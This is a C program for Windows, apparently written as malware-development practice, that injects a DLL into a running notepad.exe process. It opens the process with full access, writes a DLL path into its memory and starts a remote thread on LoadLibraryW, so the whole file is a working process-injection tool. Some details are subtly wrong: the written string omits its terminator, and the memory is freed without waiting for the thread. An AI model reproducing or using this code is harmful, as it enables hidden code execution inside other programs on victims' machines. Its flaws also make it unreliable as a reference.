#include <Windows.h>
#include <stdio.h>
#include <tlhelp32.h>
#include <wchar.h>
#include <ctype.h>

BOOL GetRemoteProcessHandle(const wchar_t* szProcessName, DWORD* dwProcessId, HANDLE* hProcess) {
    PROCESSENTRY32 Proc = { 0 };
    Proc.dwSize = sizeof(PROCESSENTRY32);

    HANDLE hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapShot == INVALID_HANDLE_VALUE) {
        printf("[!] CreateToolhelp32Snapshot Failed With Error : %d \n", GetLastError());
        return FALSE;
    }

    if (!Process32First(hSnapShot, &Proc)) {
        printf("[!] Process32First Failed With Error : %d \n", GetLastError());
        CloseHandle(hSnapShot);
        return FALSE;
    }

    do {
        WCHAR LowerName[MAX_PATH * 2];

        if (Proc.szExeFile[0]) {
            DWORD dwSize = lstrlenW(Proc.szExeFile);
            DWORD i = 0;

            RtlSecureZeroMemory(LowerName, sizeof(LowerName));

            if (dwSize < MAX_PATH * 2) {
                for (i = 0; i < dwSize; i++) {
                    LowerName[i] = (WCHAR)tolower(Proc.szExeFile[i]);
                }
                LowerName[i] = '\0';
            }

            if (wcscmp(LowerName, szProcessName) == 0) {
                // The PID
                *dwProcessId = Proc.th32ProcessID;
                // Open a Handle to the process
                *hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, Proc.th32ProcessID);
                if (*hProcess == NULL) {
                    printf("[!] OpenProcess Failed With Error : %d \n", GetLastError());
                }
                CloseHandle(hSnapShot);
                return TRUE;
            }
        }
    } while (Process32Next(hSnapShot, &Proc));

    CloseHandle(hSnapShot);
    return FALSE;
}

BOOL InjectDllToRemoteProcess(IN HANDLE hProcess, IN LPWSTR DllName) {
    BOOL bSuccess = FALSE;

    LPVOID pLoadLibraryW = NULL;
    LPVOID pAddress = NULL;
    DWORD dwSizeToWrite = lstrlenW(DllName) * sizeof(WCHAR);
    SIZE_T lpNumberOfBytesWritten = 0;
    HANDLE hThread = NULL;

    pLoadLibraryW = GetProcAddress(GetModuleHandle(L"kernel32.dll"), "LoadLibraryW");
    if (pLoadLibraryW == NULL) {
        printf("[!] GetProcAddress Failed With Error : %d \n", GetLastError());
        goto _EndOfFunction;
    }

    pAddress = VirtualAllocEx(hProcess, NULL, dwSizeToWrite, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (pAddress == NULL) {
        printf("[!] VirtualAllocEx Failed With Error : %d \n", GetLastError());
        goto _EndOfFunction;
    }

    printf("[!] pAddress Allocated At : 0x%p Of Size : %d\n", pAddress, dwSizeToWrite);
    printf("[#] Press <Enter> To Write Babe ...");
    getchar();

    if (!WriteProcessMemory(hProcess, pAddress, DllName, dwSizeToWrite, &lpNumberOfBytesWritten) || lpNumberOfBytesWritten != dwSizeToWrite) {
        printf("[!] WriteProcessMemory Failed With Error : %d \n", GetLastError());
        goto _EndOfFunction;
    }

    printf("[i] Successfully Written %d Bytes\n", lpNumberOfBytesWritten);
    printf("[#] Press <Enter> To Run ...");
    getchar();

    printf("[i] Executing Payload ...");
    hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pLoadLibraryW, pAddress, 0, NULL);
    if (hThread == NULL) {
        printf("[!] CreateRemoteThread Failed With Error : %d \n", GetLastError());
        goto _EndOfFunction;
    }

    printf("[+] Done!\n");
    bSuccess = TRUE;

_EndOfFunction:
    if (hThread)
        CloseHandle(hThread);

    if (pAddress)
        VirtualFreeEx(hProcess, pAddress, 0, MEM_RELEASE);

    return bSuccess;
}

int main() {
    const wchar_t* szProcessName = L"notepad.exe";
    DWORD dwProcessId = 0;
    HANDLE hProcess = NULL;

    const wchar_t* dllname = L"C:\\Users\\Malware Development\\DLL\\x64\\Debug\\DLL.dll";

    if (!GetRemoteProcessHandle(szProcessName, &dwProcessId, &hProcess)) {
        return -1;
    }

    printf("Target Process With PID %d\n", dwProcessId);

    if (!InjectDllToRemoteProcess(hProcess, (LPWSTR)dllname)) {
        return -1;
    }

    printf("[i] Done");

    return 0;
}
